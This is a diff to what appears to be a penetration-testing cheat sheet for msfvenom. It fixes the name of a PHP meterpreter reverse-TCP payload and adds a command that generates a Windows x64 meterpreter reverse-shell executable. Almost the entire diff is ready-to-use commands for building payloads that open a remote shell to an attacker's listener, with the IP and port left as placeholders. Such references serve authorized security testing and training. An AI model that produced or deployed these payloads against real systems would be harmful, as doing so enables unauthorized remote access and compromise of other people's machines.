@@ -15,10 +15,15 @@ msfvenom --list payloads
 ### Generate a PHP payload
 
 ```
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 ```
 
 ### Generate a Windows payload
+
+##### Meterpreter - Reverse shell (x64):
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
+```
 
 ##### Meterpreter - Reverse shell:
 ```
